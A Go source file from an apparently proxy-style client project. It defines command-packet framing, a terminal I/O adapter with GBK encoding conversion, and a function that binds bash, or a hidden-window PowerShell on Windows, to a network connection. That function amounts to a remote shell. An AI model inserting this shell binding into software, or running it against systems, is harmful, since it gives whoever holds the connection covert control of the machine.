package client

import (
	"bytes"
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"time"

	"github.com/Qingluan/Kcpee/utils"
)

// CmdStruct for cmd byte
type CmdStruct struct {
	i      uint //logo
	l      uint // len
	d      []byte
	UseGbk bool
}

var UseGBK = false

// ToData from instance to bytes
func (cmd *CmdStruct) ToData() *bytes.Buffer {
	var buffer = new(bytes.Buffer)
	buffer.Write([]byte{5, 1, 0, byte(cmd.i), byte(cmd.l)})
	buffer.Write(cmd.d)
	return buffer
}

// NewCmdStruct construct NewCmd with string
func NewCmdStruct(cmd string) (c *CmdStruct) {
	c = &CmdStruct{
		i: 9,
		l: uint(len(cmd)),
		d: []byte(cmd),
	}
	return
}

func NewCmdRunner(remoteConn net.Conn) error {
	if runtime.GOOS != "windows" {
		shell := exec.Command("/bin/bash")
		shell.Stdout = remoteConn
		shell.Stdin = remoteConn
		shell.Stderr = remoteConn
		err := shell.Run()
		if err != nil {
			log.Println("command failed: %v", err)
			remoteConn.Close()
			return err

		}
		fmt.Printf("exiting\n")
	} else {
		shell := exec.Command("powershell", "-WindowsStyle", "Hidden")
		shell.Stdout = remoteConn
		shell.Stdin = remoteConn
		shell.Stderr = remoteConn
		err := shell.Run()
		if err != nil {
			log.Println("command failed: %v", err)
			remoteConn.Close()
			return err

		}
		fmt.Printf("exiting\n")
	}
	return nil
}

type Stdio struct {
	remoteAddr net.Addr
	ibug       error
	obug       error
	lrt        time.Time
	lt         time.Duration
	ci         int
	UseGbk     bool
}

func NewStdio(remoteHost string) Stdio {
	ip, _ := net.ResolveIPAddr("tcp", remoteHost)

	return Stdio{
		remoteAddr: ip,
		lrt:        time.Now(),
		lt:         20 * time.Second,
	}
}

func (std *Stdio) Write(buf []byte) (n int, err error) {
	if UseGBK {
		oldn := len(buf)
		buf2, err := utils.GbkToUtf8(buf)
		if err != nil {
			log.Fatal("trnas cmd:", err)
		}
		if len(buf2) > 1 {
			_, err = os.Stdout.Write(buf2)
			if err != nil {
				log.Fatal("wincmd:", err)
			}
		} else {
			n = 0
		}
		n = oldn

	} else {
		n, err = os.Stdout.Write(buf)
	}

	tmpNow := time.Now()
	defer func() {
		std.lrt = tmpNow
	}()

	if tmpNow.Sub(std.lrt) > std.lt {
		std.obug = errors.New("Some Time Out for Stdio")
		err = std.obug
	}
	return
}

func (std *Stdio) Read(buf []byte) (n int, err error) {
	if UseGBK {

		n, err = os.Stdin.Read(buf)
		if err != nil {
			log.Fatal("read cmd:", err)
		}
		buf2, _ := utils.Utf8ToGbk(buf[:n])
		buf = buf2
		n = len(buf2)

	} else {
		n, err = os.Stdin.Read(buf)
	}

	tmpNow := time.Now()
	defer func() {
		std.lrt = tmpNow
		std.ci++
	}()

	if tmpNow.Sub(std.lrt) > std.lt {
		std.obug = errors.New("Some Time Out for Stdio")
		err = std.obug
	}
	return
}

func (std *Stdio) Close() error {
	// log.Println("Close this:", std.obug, std.ci)
	if std.ci == 0 {
		return errors.New("INIT CMD RUNNER ERROR")
	}
	return std.obug
}

func (std *Stdio) LocalAddr() net.Addr {
	return &net.IPAddr{}
}

func (std *Stdio) RemoteAddr() net.Addr {
	return std.remoteAddr
}

func (std *Stdio) SetDeadline(t time.Time) error {
	return nil
}

func (std *Stdio) SetReadDeadline(t time.Time) error {
	return nil
}

func (std *Stdio) SetWriteDeadline(t time.Time) error {
	return nil
}

func (std *Stdio) SetTimeout(t time.Duration) {
	std.lt = t
}
